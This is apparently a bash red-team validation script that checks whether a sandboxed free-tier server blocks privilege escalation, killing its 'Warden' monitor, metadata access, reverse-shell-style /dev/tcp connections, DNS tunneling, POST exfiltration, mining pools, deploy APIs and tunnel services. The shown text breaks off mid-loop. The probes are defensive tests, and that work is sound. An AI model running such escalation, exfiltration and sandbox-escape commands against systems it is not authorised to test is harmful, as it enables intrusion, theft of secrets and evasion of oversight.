#!/bin/bash
# ============================================================================
# Coemad Ironclad — Red Team Validation Script
#
# Run this AS the `coder` user on a deployed free tier server.
# Every test should FAIL (be blocked). If any test PASSES, the
# security model is broken.
#
# Usage: bash red-team.sh
# ============================================================================
set -uo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

PASS_COUNT=0
FAIL_COUNT=0
WARN_COUNT=0

pass() {
  echo -e "  ${GREEN}[SECURE]${NC} $1"
  PASS_COUNT=$((PASS_COUNT + 1))
}

fail() {
  echo -e "  ${RED}[VULNERABLE]${NC} $1"
  FAIL_COUNT=$((FAIL_COUNT + 1))
}

warn() {
  echo -e "  ${YELLOW}[WARNING]${NC} $1"
  WARN_COUNT=$((WARN_COUNT + 1))
}

echo "============================================"
echo "  Coemad Ironclad — Red Team Validation"
echo "  Running as: $(whoami)"
echo "  Date: $(date -u)"
echo "============================================"
echo ""

# ============================================
# Domain 3.1: Sudo / Root Escalation
# ============================================
echo "=== Domain 3.1: Privilege Escalation ==="

# Test: sudo access
if sudo -n true 2>/dev/null; then
  fail "coder has sudo access (GAME OVER — all other tests meaningless)"
else
  pass "sudo access denied"
fi

# Test: su to root
if su -c "whoami" root 2>/dev/null | grep -q root; then
  fail "su to root succeeded"
else
  pass "su to root denied"
fi

# Test: pkexec
if command -v pkexec &>/dev/null; then
  warn "pkexec binary exists (potential escalation vector)"
else
  pass "pkexec not present"
fi

# Test: check if in sudo/wheel group
if groups | grep -qE '(sudo|wheel)'; then
  fail "coder is in sudo/wheel group"
else
  pass "coder not in privileged groups"
fi

echo ""

# ============================================
# Domain 3.2: Warden Process Kill
# ============================================
echo "=== Domain 3.2: Warden Resilience ==="

WARDEN_PID=$(pgrep -x warden 2>/dev/null || echo "")

if [ -z "$WARDEN_PID" ]; then
  fail "Warden process not found (not running?)"
else
  # Try to kill it
  if kill -9 "$WARDEN_PID" 2>/dev/null; then
    fail "Successfully killed Warden process (PID: $WARDEN_PID)"
    sleep 6
    # Check if it auto-restarted
    NEW_PID=$(pgrep -x warden 2>/dev/null || echo "")
    if [ -n "$NEW_PID" ]; then
      warn "Warden was killable but auto-restarted (PID: $NEW_PID)"
    fi
  else
    pass "Cannot kill Warden process (Operation not permitted)"
  fi
fi

# Try to stop via systemctl
if systemctl stop ellul-warden 2>/dev/null; then
  fail "coder can stop Warden via systemctl"
  systemctl start ellul-warden 2>/dev/null
else
  pass "Cannot stop Warden service"
fi

echo ""

# ============================================
# Domain 3.3: Metadata & Localhost Access
# ============================================
echo "=== Domain 3.3: Internal Network ==="

# Test: Hetzner metadata
if curl -sf --connect-timeout 3 http://169.254.169.254/hetzner/v1/metadata 2>/dev/null; then
  fail "Cloud metadata accessible at 169.254.169.254"
else
  pass "Cloud metadata blocked"
fi

# Test: Warden health endpoint
if curl -sf --connect-timeout 3 http://127.0.0.1:8081/_health 2>/dev/null; then
  warn "Warden health endpoint accessible on localhost (info disclosure)"
else
  pass "Warden health endpoint not accessible from coder"
fi

echo ""

# ============================================
# Domain 2.1: Network Bypass
# ============================================
echo "=== Domain 2.1: Network Isolation ==="

# Test: IPv6 bypass
IPV6_DISABLED=$(sysctl -n net.ipv6.conf.all.disable_ipv6 2>/dev/null || echo "unknown")
if [ "$IPV6_DISABLED" = "1" ]; then
  pass "IPv6 disabled system-wide"
else
  # Try actual IPv6 connection
  if curl -6 -sf --connect-timeout 5 https://ifconfig.co 2>/dev/null; then
    fail "IPv6 outbound works — complete Warden bypass"
  else
    warn "IPv6 not explicitly disabled but connection failed (may be blocked by ip6tables)"
  fi
fi

# Test: non-standard port bypass
if curl -sf --connect-timeout 5 http://httpbin.org:8080/get 2>/dev/null; then
  fail "Outbound to non-standard port (8080) bypasses Warden"
else
  pass "Non-standard port blocked"
fi

# Test: raw TCP outbound (port 4444 — common reverse shell)
if timeout 3 bash -c 'echo test > /dev/tcp/1.1.1.1/4444' 2>/dev/null; then
  fail "Raw TCP outbound to arbitrary port works"
else
  pass "Raw TCP outbound blocked"
fi

# Test: SSH outbound
if timeout 3 ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no test@1.1.1.1 2>/dev/null; then
  fail "SSH outbound works"
else
  pass "SSH outbound blocked"
fi

echo ""

# ============================================
# Domain 2.2: DNS Tunnel
# ============================================
echo "=== Domain 2.2: DNS Exfiltration ==="

# Test: TXT record query (used by dnscat2)
TXT_RESULT=$(dig +short TXT google.com 2>/dev/null || echo "blocked")
if [ -n "$TXT_RESULT" ] && [ "$TXT_RESULT" != "blocked" ]; then
  warn "TXT record queries allowed (potential tunnel vector)"
else
  pass "TXT record queries blocked"
fi

# Test: high-entropy subdomain (tunneling signature)
TUNNEL_DOMAIN="aGVsbG93b3JsZHRoaXNpc2FiYXNlNjRlbmNvZGVkc3RyaW5n.evil-tunnel-test.example.com"
if nslookup "$TUNNEL_DOMAIN" 2>/dev/null | grep -q "NXDOMAIN\|SERVFAIL\|connection timed out"; then
  pass "High-entropy subdomain blocked (tunnel detection working)"
else
  warn "High-entropy subdomain query was forwarded"
fi

echo ""

# ============================================
# Domain 2.3: Data Exfiltration
# ============================================
echo "=== Domain 2.3: Hotel California ==="

# Test: git push (if git is available)
if command -v git &>/dev/null; then
  PUSH_TEST_DIR=$(mktemp -d)
  cd "$PUSH_TEST_DIR"
  git init -q
  echo "test" > file.txt
  git add . && git commit -q -m "test"
  # Try pushing to a dummy repo
  if git push https://github.com/test/nonexistent.git main 2>&1 | grep -qi "forbidden\|blocked\|denied\|fatal"; then
    pass "git push blocked"
  else
    warn "git push attempt did not return clear block (may have failed for other reasons)"
  fi
  rm -rf "$PUSH_TEST_DIR"
else
  warn "git not installed — cannot test git push block"
fi

# Test: POST to external API
POST_RESULT=$(curl -sf -X POST https://httpbin.org/post -d "secret=exfiltrated" 2>&1)
if echo "$POST_RESULT" | grep -q "Hotel California\|Forbidden\|403"; then
  pass "POST to external domain blocked"
elif [ -z "$POST_RESULT" ]; then
  pass "POST to external domain blocked (connection refused)"
else
  fail "POST to external domain succeeded: $POST_RESULT"
fi

# Test: PUT request
PUT_RESULT=$(curl -sf -X PUT https://httpbin.org/put -d "data=stolen" 2>&1)
if echo "$PUT_RESULT" | grep -q "Hotel California\|Forbidden\|403"; then
  pass "PUT to external domain blocked"
elif [ -z "$PUT_RESULT" ]; then
  pass "PUT to external domain blocked (connection refused)"
else
  fail "PUT to external domain succeeded"
fi

# Test: GET should work (verify proxy is functional, not just broken)
GET_RESULT=$(curl -sf --connect-timeout 5 https://api.github.com 2>&1)
if echo "$GET_RESULT" | grep -q "current_user_url"; then
  pass "GET to external domain works (proxy functional, not just broken)"
else
  warn "GET to external domain failed (proxy may be non-functional rather than secure)"
fi

# Test: WebSocket to external domain
if command -v websocat &>/dev/null; then
  if timeout 5 websocat wss://echo.websocket.org 2>/dev/null; then
    fail "WebSocket to external domain works"
  else
    pass "WebSocket to external domain blocked"
  fi
else
  warn "websocat not installed — cannot test WebSocket block"
fi

echo ""

# ============================================
# Domain 5.1: Crypto Mining
# ============================================
echo "=== Domain 5.1: Mining Prevention ==="

# Test: connect to known mining pool
MINE_RESULT=$(curl -sf --connect-timeout 5 https://pool.minergate.com 2>&1)
if [ -z "$MINE_RESULT" ]; then
  pass "Mining pool domain blocked"
else
  fail "Mining pool domain accessible"
fi

# Test: Stratum protocol (TCP to common mining port)
if timeout 3 bash -c 'echo "{\"method\":\"mining.subscribe\"}" > /dev/tcp/pool.minergate.com/3333' 2>/dev/null; then
  fail "Stratum protocol connection succeeded"
else
  pass "Stratum protocol connection blocked"
fi

echo ""

# ============================================
# Domain 5.2: Resource Limits
# ============================================
echo "=== Domain 5.2: Resource Limits ==="

# Test: nproc limit
NPROC_SOFT=$(ulimit -Su 2>/dev/null || echo "unlimited")
NPROC_HARD=$(ulimit -Hu 2>/dev/null || echo "unlimited")
if [ "$NPROC_SOFT" = "unlimited" ] || [ "${NPROC_SOFT:-0}" -gt 500 ]; then
  fail "nproc limit too high or unlimited (soft=$NPROC_SOFT, hard=$NPROC_HARD) — fork bomb possible"
else
  pass "nproc limit set (soft=$NPROC_SOFT, hard=$NPROC_HARD)"
fi

# Test: nofile limit
NOFILE_SOFT=$(ulimit -Sn 2>/dev/null || echo "unlimited")
if [ "$NOFILE_SOFT" = "unlimited" ] || [ "${NOFILE_SOFT:-0}" -gt 65536 ]; then
  warn "nofile limit high (soft=$NOFILE_SOFT)"
else
  pass "nofile limit reasonable (soft=$NOFILE_SOFT)"
fi

# Test: virtual memory limit
VMEM=$(ulimit -Sv 2>/dev/null || echo "unlimited")
if [ "$VMEM" = "unlimited" ]; then
  warn "Virtual memory unlimited — no OOM protection for user processes"
else
  pass "Virtual memory limited ($VMEM KB)"
fi

echo ""

# ============================================
# Bonus: File System Checks
# ============================================
echo "=== Bonus: File System ==="

# Test: can read Warden CA private key
if cat /etc/warden/ca.key 2>/dev/null | head -1 | grep -q "PRIVATE"; then
  fail "Can read Warden CA private key (/etc/warden/ca.key)"
else
  pass "Warden CA private key not readable"
fi

# Test: can read /etc/shadow
if cat /etc/shadow 2>/dev/null | head -1 | grep -q ":"; then
  fail "Can read /etc/shadow"
else
  pass "/etc/shadow not readable"
fi

# Test: can write to /opt/ellul/
if touch /opt/ellul/config/test-write 2>/dev/null; then
  fail "Can write to /opt/ellul/config/"
  rm -f /opt/ellul/config/test-write
else
  pass "Cannot write to system config directory"
fi

# ============================================
# Domain 6: Anti-Squatting / Session Integrity
# ============================================
echo "=== Domain 6: Anti-Squatting ==="

# Test: Trap SIGTERM (simulates a server that refuses to die)
# The orchestrator's External Executioner should handle this via Hetzner API delete,
# but we verify the server CAN'T block signals from root/systemd
TRAP_SCRIPT='trap "" SIGTERM SIGKILL; while true; do sleep 1; done'
bash -c "$TRAP_SCRIPT" &
TRAP_PID=$!
sleep 1
# As coder, we expect we CAN kill our own process (this tests that coder processes are mortal)
if kill -TERM $TRAP_PID 2>/dev/null; then
  wait $TRAP_PID 2>/dev/null
  pass "User processes respond to SIGTERM (orchestrator can kill via cgroup)"
else
  kill -9 $TRAP_PID 2>/dev/null
  wait $TRAP_PID 2>/dev/null
  warn "SIGTERM failed (but SIGKILL still works)"
fi

# Test: Can coder modify systemd timers (to prevent hibernation cron)
if systemctl --user enable sometimer.timer 2>/dev/null; then
  fail "Coder can create/enable systemd user timers"
else
  pass "Coder cannot manipulate systemd timers"
fi

# Test: Can coder modify crontab (alternative squatting vector)
if crontab -l 2>/dev/null; then
  warn "Coder has crontab access (could schedule keep-alive scripts)"
else
  pass "Coder crontab not accessible"
fi

# Test: Verify coder.slice resource limits exist
if systemctl show coder.slice 2>/dev/null | grep -q "CPUQuota"; then
  CPUQUOTA=$(systemctl show coder.slice 2>/dev/null | grep CPUQuota | head -1)
  pass "coder.slice CPU limit active ($CPUQUOTA)"
else
  warn "coder.slice not found or no CPU limits (resource squatting possible)"
fi

echo ""

# ============================================
# Domain 7.1: SUID Binary Audit
# ============================================
echo "=== Domain 7.1: SUID/SGID Audit ==="

# Whitelist: only these SUID binaries should exist
SUID_WHITELIST="/usr/bin/passwd /usr/lib/openssh/ssh-keysign"

SUID_VIOLATIONS=0
while IFS= read -r binary; do
  allowed=false
  for w in $SUID_WHITELIST; do
    if [ "$binary" = "$w" ]; then
      allowed=true
      break
    fi
  done
  if [ "$allowed" = false ]; then
    fail "Unexpected SUID binary: $binary"
    SUID_VIOLATIONS=$((SUID_VIOLATIONS + 1))
  fi
done < <(find / -perm -4000 -type f 2>/dev/null)

if [ "$SUID_VIOLATIONS" -eq 0 ]; then
  pass "No unexpected SUID binaries found"
fi

# Check SGID binaries
SGID_COUNT=$(find / -perm -2000 -type f 2>/dev/null | wc -l)
if [ "$SGID_COUNT" -gt 0 ]; then
  warn "Found $SGID_COUNT SGID binaries (run 'find / -perm -2000 -type f' to inspect)"
else
  pass "No SGID binaries found"
fi

# Test: critical escalation binaries are neutered
for binary in /usr/bin/sudo /usr/bin/su /usr/bin/pkexec /usr/bin/newgrp /usr/bin/doas /usr/bin/chsh /usr/bin/chfn /usr/bin/gpasswd; do
  if [ -f "$binary" ] && [ -x "$binary" ]; then
    fail "Escalation binary is executable: $binary"
  elif [ -f "$binary" ]; then
    pass "Escalation binary exists but not executable: $binary"
  fi
done

echo ""

# ============================================
# Domain 7.2: Network Breakout (Expanded)
# ============================================
echo "=== Domain 7.2: Network Breakout ==="

# Test: coder group membership
DANGER_GROUPS="sudo wheel netdev docker lxd adm"
for grp in $DANGER_GROUPS; do
  if groups 2>/dev/null | grep -qw "$grp"; then
    fail "Coder is in privileged group: $grp"
  fi
done
pass "Coder not in any privileged groups ($DANGER_GROUPS)"

# Test: iptables access
if /sbin/iptables -L 2>/dev/null; then
  fail "Coder can read iptables rules"
else
  pass "iptables not accessible to coder"
fi

# Test: ip command (network modification)
if /usr/bin/ip link 2>/dev/null; then
  warn "ip command accessible (read-only may be OK, but check if can modify)"
  if /usr/bin/ip link set lo down 2>/dev/null; then
    fail "Coder can modify network interfaces"
    /usr/bin/ip link set lo up 2>/dev/null
  else
    pass "ip command read-only (cannot modify interfaces)"
  fi
else
  pass "ip command not accessible to coder"
fi

# Test: /proc visibility (hidepid=2)
OTHER_PROCS=$(ls /proc/*/cmdline 2>/dev/null | grep -v "/proc/self" | grep -v "/proc/thread" | wc -l)
CODER_UID=$(id -u)
VISIBLE_OTHERS=0
for pid_dir in /proc/[0-9]*/; do
  pid_uid=$(stat -c %u "$pid_dir" 2>/dev/null || echo "")
  if [ -n "$pid_uid" ] && [ "$pid_uid" != "$CODER_UID" ] && [ "$pid_uid" != "0" ]; then
    VISIBLE_OTHERS=$((VISIBLE_OTHERS + 1))
  fi
done
if [ "$VISIBLE_OTHERS" -gt 0 ]; then
  warn "Can see $VISIBLE_OTHERS processes from other users (hidepid=2 not active?)"
else
  pass "Cannot see other users' processes (hidepid=2 active)"
fi

# Test: package installation
if apt-get install curl 2>/dev/null; then
  fail "Coder can install packages via apt-get"
else
  pass "apt-get not accessible to coder"
fi

echo ""

# ============================================
# Domain 7.3: Fake Root Test
# ============================================
echo "=== Domain 7.3: Fake Root ==="

# Test: install sudo (should fail — apt locked down)
if apt-get install -y sudo 2>/dev/null; then
  fail "Coder can install sudo via apt-get"
else
  pass "Cannot install sudo (apt-get locked down)"
fi

# Test: download and run a static sudo binary
if curl -sf --connect-timeout 5 https://github.com/nicmcd/sudo-static/raw/main/sudo -o /tmp/fake-sudo 2>/dev/null; then
  chmod +x /tmp/fake-sudo 2>/dev/null
  if /tmp/fake-sudo whoami 2>/dev/null | grep -q root; then
    fail "Static sudo binary works (downloaded and escalated)"
  else
    pass "Static sudo binary downloaded but cannot escalate (no SUID bit)"
  fi
  rm -f /tmp/fake-sudo
else
  pass "Cannot download static binaries (GET may work but binary may not function)"
fi

# Test: nsenter (container escape / namespace manipulation)
if command -v nsenter &>/dev/null; then
  if nsenter -t 1 -m -p -- whoami 2>/dev/null | grep -q root; then
    fail "nsenter to PID 1 namespace succeeded (container escape)"
  else
    pass "nsenter cannot enter PID 1 namespace"
  fi
else
  pass "nsenter not available"
fi

# Test: unshare (create new namespace — potential escalation)
if unshare --map-root-user whoami 2>/dev/null | grep -q root; then
  warn "unshare --map-root-user works (fake root in new namespace)"
else
  pass "unshare namespace trick blocked"
fi

# ============================================
# Domain 8: The "No Deploy" Wall (Anti-Exfiltration)
# ============================================
echo "=== Domain 8: The No Deploy Wall ==="

# ---- 8.1: Cloud CLI Deploy Test ----
echo "  --- 8.1: Cloud CLI Deploy ---"

# Test: Vercel deploy (POST to api.vercel.com)
# The connection must FAIL (timeout/refused/reset), NOT return 401 (which means the packet reached them)
VERCEL_RESULT=$(curl -sf -o /dev/null -w "%{http_code}" --connect-timeout 5 -X POST \
  https://api.vercel.com/v13/deployments \
  -H "Content-Type: application/json" \
  -d '{"name":"test"}' 2>&1)
VERCEL_EXIT=$?
if [ "$VERCEL_EXIT" -ne 0 ] || [ -z "$VERCEL_RESULT" ] || [ "$VERCEL_RESULT" = "000" ]; then
  pass "Vercel deploy blocked (connection failed — packet never reached Vercel)"
elif [ "$VERCEL_RESULT" = "403" ]; then
  pass "Vercel deploy blocked by Warden (403 Hotel California)"
elif [ "$VERCEL_RESULT" = "401" ]; then
  fail "Vercel API reachable! Got 401 (packet reached api.vercel.com — DNS blackhole failed)"
else
  warn "Vercel returned HTTP $VERCEL_RESULT (investigate — expected connection failure)"
fi

# Test: Fly.io deploy
FLY_RESULT=$(curl -sf -o /dev/null -w "%{http_code}" --connect-timeout 5 -X POST \
  https://api.fly.io/graphql 2>&1)
FLY_EXIT=$?
if [ "$FLY_EXIT" -ne 0 ] || [ -z "$FLY_RESULT" ] || [ "$FLY_RESULT" = "000" ]; then
  pass "Fly.io deploy blocked (connection failed)"
elif [ "$FLY_RESULT" = "403" ]; then
  pass "Fly.io deploy blocked by Warden (403)"
else
  fail "Fly.io API reachable (HTTP $FLY_RESULT)"
fi

# Test: Heroku deploy
HEROKU_RESULT=$(curl -sf -o /dev/null -w "%{http_code}" --connect-timeout 5 -X POST \
  https://api.heroku.com/apps 2>&1)
HEROKU_EXIT=$?
if [ "$HEROKU_EXIT" -ne 0 ] || [ -z "$HEROKU_RESULT" ] || [ "$HEROKU_RESULT" = "000" ]; then
  pass "Heroku deploy blocked (connection failed)"
elif [ "$HEROKU_RESULT" = "403" ]; then
  pass "Heroku deploy blocked by Warden (403)"
else
  fail "Heroku API reachable (HTTP $HEROKU_RESULT)"
fi

# Test: Railway deploy
RAILWAY_RESULT=$(curl -sf -o /dev/null -w "%{http_code}" --connect-timeout 5 -X POST \
  https://backboard.railway.app/graphql 2>&1)
RAILWAY_EXIT=$?
if [ "$RAILWAY_EXIT" -ne 0 ] || [ -z "$RAILWAY_RESULT" ] || [ "$RAILWAY_RESULT" = "000" ]; then
  pass "Railway deploy blocked (connection failed)"
elif [ "$RAILWAY_RESULT" = "403" ]; then
  pass "Railway deploy blocked by Warden (403)"
else
  fail "Railway API reachable (HTTP $RAILWAY_RESULT)"
fi

# Test: AWS S3 upload
AWS_RESULT=$(curl -sf -o /dev/null -w "%{http_code}" --connect-timeout 5 -X PUT \
  https://s3.amazonaws.com/test-bucket/test.js \
  -d "exfil" 2>&1)
AWS_EXIT=$?
if [ "$AWS_EXIT" -ne 0 ] || [ -z "$AWS_RESULT" ] || [ "$AWS_RESULT" = "000" ]; then
  pass "AWS S3 blocked (connection failed)"
elif [ "$AWS_RESULT" = "403" ]; then
  pass "AWS S3 blocked by Warden (403)"
else
  fail "AWS S3 API reachable (HTTP $AWS_RESULT)"
fi

# Test: Netlify deploy
NETLIFY_RESULT=$(curl -sf -o /dev/null -w "%{http_code}" --connect-timeout 5 -X POST \
  https://api.netlify.com/api/v1/sites 2>&1)
NETLIFY_EXIT=$?
if [ "$NETLIFY_EXIT" -ne 0 ] || [ -z "$NETLIFY_RESULT" ] || [ "$NETLIFY_RESULT" = "000" ]; then
  pass "Netlify deploy blocked (connection failed)"
elif [ "$NETLIFY_RESULT" = "403" ]; then
  pass "Netlify deploy blocked by Warden (403)"
else
  fail "Netlify API reachable (HTTP $NETLIFY_RESULT)"
fi

# Test: Docker Hub push
DOCKER_RESULT=$(curl -sf -o /dev/null -w "%{http_code}" --connect-timeout 5 -X POST \
  https://hub.docker.com/v2/repositories/test/tags 2>&1)
DOCKER_EXIT=$?
if [ "$DOCKER_EXIT" -ne 0 ] || [ -z "$DOCKER_RESULT" ] || [ "$DOCKER_RESULT" = "000" ]; then
  pass "Docker Hub blocked (connection failed)"
elif [ "$DOCKER_RESULT" = "403" ]; then
  pass "Docker Hub blocked by Warden (403)"
else
  fail "Docker Hub reachable (HTTP $DOCKER_RESULT)"
fi

echo ""

# ---- 8.2: Tunnel Test ----
echo "  --- 8.2: Tunnel Services ---"

# Test: ngrok agent connection
NGROK_RESULT=$(curl -sf -o /dev/null -w "%{http_code}" --connect-timeout 5 \
  https://connect.ngrok-agent.com/tunnel 2>&1)
NGROK_EXIT=$?
if [ "$NGROK_EXIT" -ne 0 ] || [ -z "$NGROK_RESULT" ] || [ "$NGROK_RESULT" = "000" ]; then
  pass "ngrok agent connection blocked (cannot reach connect.ngrok-agent.com)"
elif [ "$NGROK_RESULT" = "403" ]; then
  pass "ngrok blocked by Warden (403)"
else
  fail "ngrok agent reachable! (HTTP $NGROK_RESULT — tunnel possible)"
fi

# Test: Cloudflare Tunnel
CF_TUNNEL_RESULT=$(curl -sf -o /dev/null -w "%{http_code}" --connect-timeout 5 \
  https://api.trycloudflare.com/tunnel 2>&1)
CF_TUNNEL_EXIT=$?
if [ "$CF_TUNNEL_EXIT" -ne 0 ] || [ -z "$CF_TUNNEL_RESULT" ] || [ "$CF_TUNNEL_RESULT" = "000" ]; then
  pass "Cloudflare Tunnel blocked (cannot reach trycloudflare.com)"
elif [ "$CF_TUNNEL_RESULT" = "403" ]; then
  pass "Cloudflare Tunnel blocked by Warden (403)"
else
  fail "Cloudflare Tunnel reachable (HTTP $CF_TUNNEL_RESULT)"
fi

# Test: localtunnel
LT_RESULT=$(curl -sf -o /dev/null -w "%{http_code}" --connect-timeout 5 \
  https://localtunnel.me/api/tunnels 2>&1)
LT_EXIT=$?
if [ "$LT_EXIT" -ne 0 ] || [ -z "$LT_RESULT" ] || [ "$LT_RESULT" = "000" ]; then
  pass "localtunnel blocked (cannot reach localtunnel.me)"
elif [ "$LT_RESULT" = "403" ]; then
  pass "localtunnel blocked by Warden (403)"
else
  fail "localtunnel reachable (HTTP $LT_RESULT)"
fi

# Test: serveo.net (SSH-based tunnel — port 22 already blocked, but check DNS too)
SERVEO_RESULT=$(curl -sf -o /dev/null -w "%{http_code}" --connect-timeout 5 \
  https://serveo.net 2>&1)
SERVEO_EXIT=$?
if [ "$SERVEO_EXIT" -ne 0 ] || [ -z "$SERVEO_RESULT" ] || [ "$SERVEO_RESULT" = "000" ]; then
  pass "serveo.net blocked (double-blocked: DNS + port 22)"
elif [ "$SERVEO_RESULT" = "403" ]; then
  pass "serveo.net blocked by Warden (403)"
else
  fail "serveo.net reachable (HTTP $SERVEO_RESULT)"
fi

# Test: bore.pub
BORE_RESULT=$(curl -sf -o /dev/null -w "%{http_code}" --connect-timeout 5 \
  https://bore.pub 2>&1)
BORE_EXIT=$?
if [ "$BORE_EXIT" -ne 0 ] || [ -z "$BORE_RESULT" ] || [ "$BORE_RESULT" = "000" ]; then
  pass "bore.pub blocked"
elif [ "$BORE_RESULT" = "403" ]; then
  pass "bore.pub blocked by Warden (403)"
else
  fail "bore.pub reachable (HTTP $BORE_RESULT)"
fi

# Test: tailscale (VPN tunnel)
TAILSCALE_RESULT=$(curl -sf -o /dev/null -w "%{http_code}" --connect-timeout 5 \
  https://login.tailscale.com/api/auth/keys 2>&1)
TAILSCALE_EXIT=$?
if [ "$TAILSCALE_EXIT" -ne 0 ] || [ -z "$TAILSCALE_RESULT" ] || [ "$TAILSCALE_RESULT" = "000" ]; then
  pass "Tailscale blocked (cannot reach login.tailscale.com)"
elif [ "$TAILSCALE_RESULT" = "403" ]; then
  pass "Tailscale blocked by Warden (403)"
else
  fail "Tailscale reachable (HTTP $TAILSCALE_RESULT)"
fi

echo ""

# ---- 8.3: Write-Only Rule Verification ----
echo "  --- 8.3: Write-Only Rule (POST to arbitrary domains) ---"

# Test: POST to webhook.site (generic exfiltration endpoint)
WEBHOOK_RESULT=$(curl -sf -o /dev/null -w "%{http_code}" --connect-timeout 5 -X POST \
  https://webhook.site/test-endpoint \
  -d "secret=exfiltrated-code" 2>&1)
WEBHOOK_EXIT=$?
if [ "$WEBHOOK_EXIT" -ne 0 ] || [ -z "$WEBHOOK_RESULT" ] || [ "$WEBHOOK_RESULT" = "000" ]; then
  pass "POST to webhook.site blocked (connection failed)"
elif [ "$WEBHOOK_RESULT" = "403" ]; then
  pass "POST to webhook.site blocked by Warden (403 Hotel California)"
else
  fail "POST to webhook.site succeeded (HTTP $WEBHOOK_RESULT — exfiltration possible!)"
fi

# Test: POST to requestbin (another common exfil endpoint)
REQBIN_RESULT=$(curl -sf -o /dev/null -w "%{http_code}" --connect-timeout 5 -X POST \
  https://requestbin.com/test \
  -d "data=stolen" 2>&1)
REQBIN_EXIT=$?
if [ "$REQBIN_EXIT" -ne 0 ] || [ -z "$REQBIN_RESULT" ] || [ "$REQBIN_RESULT" = "000" ]; then
  pass "POST to requestbin blocked"
elif [ "$REQBIN_RESULT" = "403" ]; then
  pass "POST to requestbin blocked by Warden (403)"
else
  fail "POST to requestbin succeeded (HTTP $REQBIN_RESULT)"
fi

# Test: POST to random domain (ensure catch-all POST block works)
RANDOM_POST_RESULT=$(curl -sf -o /dev/null -w "%{http_code}" --connect-timeout 5 -X POST \
  https://httpbin.org/post \
  -d "exfil=test" 2>&1)
RANDOM_POST_EXIT=$?
if [ "$RANDOM_POST_EXIT" -ne 0 ] || [ -z "$RANDOM_POST_RESULT" ] || [ "$RANDOM_POST_RESULT" = "000" ]; then
  pass "POST to httpbin.org blocked (connection failed)"
elif [ "$RANDOM_POST_RESULT" = "403" ]; then
  pass "POST to httpbin.org blocked by Warden (403)"
else
  fail "POST to httpbin.org succeeded (HTTP $RANDOM_POST_RESULT — POST catch-all broken!)"
fi

# Test: npm publish (should be blocked — it's a PUT to registry.npmjs.org)
NPM_PUB_RESULT=$(curl -sf -o /dev/null -w "%{http_code}" --connect-timeout 5 -X PUT \
  https://registry.npmjs.org/fake-package \
  -H "Content-Type: application/json" \
  -d '{"name":"fake"}' 2>&1)
NPM_PUB_EXIT=$?
if [ "$NPM_PUB_EXIT" -ne 0 ] || [ -z "$NPM_PUB_RESULT" ] || [ "$NPM_PUB_RESULT" = "000" ]; then
  pass "npm publish blocked (connection failed)"
elif [ "$NPM_PUB_RESULT" = "403" ]; then
  pass "npm publish blocked by Warden (403)"
else
  fail "npm publish reachable (HTTP $NPM_PUB_RESULT — PUT to registry.npmjs.org works)"
fi

# Test: Sanity check — GET should still work (proxy is enforcing, not broken)
SANITY_GET=$(curl -sf --connect-timeout 5 -o /dev/null -w "%{http_code}" https://api.github.com 2>&1)
if [ "$SANITY_GET" = "200" ]; then
  pass "GET to api.github.com works (proxy is enforcing, not broken)"
else
  warn "GET to api.github.com returned $SANITY_GET (proxy may be non-functional)"
fi

# Test: npm install should still work (GET to registry.npmjs.org)
NPM_GET=$(curl -sf --connect-timeout 5 -o /dev/null -w "%{http_code}" \
  https://registry.npmjs.org/express 2>&1)
if [ "$NPM_GET" = "200" ]; then
  pass "npm install works (GET to registry.npmjs.org allowed)"
else
  warn "npm install may be broken (GET to registry.npmjs.org returned $NPM_GET)"
fi

# ============================================
# Domain 9: Command Shims (UX Layer)
# ============================================
echo "=== Domain 9: Command Shims ==="

# ---- 9.1: git shim ----
echo "  --- 9.1: git shim ---"

# Test: git push should be intercepted by shim with friendly message
GIT_PUSH_OUT=$(git push origin main 2>&1)
GIT_PUSH_EXIT=$?
if [ "$GIT_PUSH_EXIT" -ne 0 ] && echo "$GIT_PUSH_OUT" | grep -qi "free tier\|blocked\|upgrade"; then
  pass "git push blocked by shim with upgrade message"
else
  warn "git push not intercepted by shim (exit=$GIT_PUSH_EXIT) — Warden is still the backstop"
fi

# Test: git shim is in /usr/local/bin and takes priority
GIT_PATH=$(which git 2>/dev/null)
if [ "$GIT_PATH" = "/usr/local/bin/git" ]; then
  pass "git shim at /usr/local/bin/git (correct PATH priority)"
elif [ "$GIT_PATH" = "/usr/bin/git" ]; then
  warn "git resolves to /usr/bin/git (shim not installed or PATH wrong)"
else
  warn "git at unexpected path: $GIT_PATH"
fi

# Test: git clone should still work (passthrough)
GIT_CLONE_OUT=$(git clone --depth 1 https://github.com/octocat/Hello-World.git /tmp/shim-test-clone 2>&1)
GIT_CLONE_EXIT=$?
rm -rf /tmp/shim-test-clone
if [ "$GIT_CLONE_EXIT" -eq 0 ]; then
  pass "git clone works through shim (passthrough to /usr/bin/git)"
else
  warn "git clone failed (exit=$GIT_CLONE_EXIT) — may be network or shim issue"
fi

# Test: git status, commit, log should work
if git status 2>/dev/null; then
  pass "git status works through shim"
else
  # Not in a repo is fine, we just need it to not show "blocked"
  GIT_STATUS_OUT=$(git status 2>&1)
  if echo "$GIT_STATUS_OUT" | grep -qi "free tier\|blocked"; then
    fail "git status blocked by shim (shim is too aggressive)"
  else
    pass "git status passes through shim (not in a repo, but not blocked)"
  fi
fi

echo ""

# ---- 9.2: ssh/scp/rsync shims ----
echo "  --- 9.2: ssh/scp/rsync shims ---"

SSH_OUT=$(ssh test@example.com 2>&1)
SSH_EXIT=$?
if [ "$SSH_EXIT" -ne 0 ] && echo "$SSH_OUT" | grep -qi "free tier\|blocked\|upgrade"; then
  pass "ssh blocked by shim with upgrade message"
else
  warn "ssh shim not active (exit=$SSH_EXIT)"
fi

SCP_OUT=$(scp test.txt user@example.com:/tmp/ 2>&1)
SCP_EXIT=$?
if [ "$SCP_EXIT" -ne 0 ] && echo "$SCP_OUT" | grep -qi "free tier\|blocked\|upgrade"; then
  pass "scp blocked by shim with upgrade message"
else
  warn "scp shim not active"
fi

echo ""

# ---- 9.3: Deploy tool shims ----
echo "  --- 9.3: Deploy tool shims ---"

DEPLOY_SHIMS="vercel flyctl netlify heroku aws gcloud az railway render wrangler"
for tool in $DEPLOY_SHIMS; do
  TOOL_OUT=$($tool 2>&1)
  TOOL_EXIT=$?
  if [ "$TOOL_EXIT" -ne 0 ] && echo "$TOOL_OUT" | grep -qi "blocked\|free tier\|upgrade"; then
    pass "$tool shim active (shows upgrade message)"
  elif ! command -v "$tool" &>/dev/null; then
    pass "$tool not found in PATH (acceptable — no shim needed if binary absent)"
  else
